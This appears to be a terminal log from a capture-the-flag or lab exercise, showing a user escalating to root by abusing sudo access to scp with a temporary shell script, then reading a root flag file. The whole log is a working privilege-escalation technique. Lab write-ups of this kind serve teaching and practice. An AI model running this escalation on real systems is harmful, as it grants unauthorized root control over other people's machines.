+dennis@ip-10-130-176-234:~$ TF=$(mktemp)
+dennis@ip-10-130-176-234:~$ echo 'sh 0<&2 1>&2' > $TF
+dennis@ip-10-130-176-234:~$ chmod +x "$TF"
+dennis@ip-10-130-176-234:~$ sudo scp -S $TF x y:
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/flag5.txt
+[REDACTED]
+# Connection to 10.130.176.234 closed by remote host.
+Connection to 10.130.176.234 closed.
+
+
+
+
